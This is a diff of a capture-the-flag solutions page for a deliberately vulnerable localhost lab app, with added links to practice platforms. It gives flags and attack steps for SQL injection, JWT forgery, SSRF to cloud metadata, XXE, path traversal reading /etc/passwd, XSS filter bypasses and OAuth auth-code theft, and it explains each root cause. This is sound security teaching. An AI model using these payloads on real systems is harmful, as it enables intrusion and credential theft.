@@ -1,7 +1,12 @@
+---
+tags: [css-exam, labs, solution, web]
+---
 # VulnNexus (app 2 — medium→hard) — Solutions
 > ↑ Lab Kit · method: Web Penetration Test Checklist
 
 `B=http://localhost:8001`. Seven challenges (six distinct flags — XXE reuses the path-traversal flag). Try each yourself first. (Track them on the 📊 Progress page.)
+
+> 🧭 **Level up (free platforms):** [PortSwigger Web Security Academy](https://portswigger.net/web-security) · [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) · [TryHackMe](https://tryhackme.com/) · [Hack The Box](https://www.hackthebox.com/)
 
 ## 🏁 Flags — one per vuln
 | Vuln | Flag | How |
@@ -15,6 +20,9 @@
 | OAuth (redirect_uri) | `FLAG{oauth_redirect_uri_not_validated}` | `oauth_authorize.php?redirect_uri=<attacker>` → steal code → `oauth_callback.php?code=` |
 
 ## 1. UNION SQL injection  (`search.php?q=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — SQL injection (UNION attacks)](https://portswigger.net/web-security/sql-injection/union-attacks) · [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
+
 **Answer:** `q` concatenated into a 3-column query → UNION-dump the `secrets` table.
 **Command:**
 ```
@@ -58,6 +66,9 @@ algorithm sets the cost** — legacy MD5/SHA-1 fall instantly, a salt forces one
 bcrypt's work factor is what actually buys time; none of it helps a weak or reused password.
 
 ## 2. JWT forgery  (`login.php` → `account.php`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt) · [jwt.io](https://jwt.io/)
+
 **Answer:** the verifier accepts **`alg:none`** *and* signs HS256 with a **weak secret** (`secret`). Either path forges `role=admin`.
 **Command (alg:none — no signature needed):**
 ```
@@ -74,6 +85,9 @@ hashcat -m 16500 token.jwt /usr/share/wordlists/rockyou.txt      # or: jwt_tool 
 **Result:** `FLAG{jwt_4lg_none_or_w3ak_s3cret_forg3d_admin}`. **Reason:** `alg:none` branch returns the payload unverified; HS256 secret is guessable. Deck: JWT Attacks.
 
 ## 3. SSRF  (`fetch.php?url=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf) · [flaws2.cloud](http://flaws2.cloud/)
+
 **Answer:** `fetch.php` is a server-side fetcher (a link/image-preview proxy) meant for **external** URLs.
 With no allow-list you aim it at targets only the **server** can reach — the real **cloud instance-metadata
 service** (AWS `169.254.169.254`, GCP `metadata.google.internal`, Azure) or local files via `file://`. The
@@ -105,6 +119,9 @@ block link-local/private IPs *after* normalization, and require IMDSv2 (PUT sess
 Deck: SSRF_Guide · SSRF_Payload.
 
 ## 4. XXE  (`import.php`, POST XML)   *(needs the `php-xml` extension — see note below)*
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — XXE injection](https://portswigger.net/web-security/xxe)
+
 **Answer:** the XML parser resolves external entities → read local files. The filter escalates per level,
 but **every level stays a local file read** (self-contained — no out-of-band listener needed):
 ```
@@ -128,17 +145,23 @@ enabled. Deck: XXE.
 > then this one exercise can't run — every other app-2 vuln is unaffected.
 
 ## 5. Path traversal  (`download.php?file=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — File path traversal](https://portswigger.net/web-security/file-path-traversal)
+
 **Answer:** `file` is appended to `docs/` with no sanitisation → climb out.
 Decode/crack reps: the target dir also has `secret_config.b64` (`base64 -d`) and `secret_config.sha1salt`
 (`<sha1>:<salt>` → `hashcat -m 110` → `shadow`), reachable with the same `../` traversal.
 **Command:**
 ```
 curl -sG "$B/download.php" --data-urlencode "file=../private2/secret_config.txt"
-curl -sG "$B/download.php" --data-urlencode "file=../../../../../../etc/passwd"
+curl -sG "$B/download.php" --data-urlencode "file=../../../../../../../etc/passwd"   # add more ../ until it reaches / (install-depth dependent)
 ```
 **Result:** `FLAG{tr4versed_out_of_the_docs_directory}` + an internal API token. **Reason:** `readfile(__DIR__."/docs/".$file)`. Deck: Path_Traversal.
 
 ## 6. Filtered reflected XSS  (`greet.php?name=`)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
+
 **Answer:** the filter only strips a literal `<script>` (case-insensitive, once) — trivially bypassed.
 **Command (two bypasses):**
 ```
@@ -148,6 +171,9 @@ $B/greet.php?name=<scr<script>ipt>alert(1)</scr</script>ipt>        # nested: in
 **Result:** the payload executes. **Reason:** blacklist filtering (`str_ireplace('<script>','')`) instead of output-encoding. Deck: XSS_02_Payloads · XSS_06_CSP_Bypass.
 
 ## 7. OAuth — unvalidated `redirect_uri` (auth-code theft)
+
+> 🎯 **Practice this elsewhere:** [PortSwigger — OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
+
 **Answer:** the authorization endpoint sends the victim's auth code to **any** `redirect_uri` (no allow-list), so an attacker steals the code and logs in as the victim (`admin`).
 **Command:**
 ```
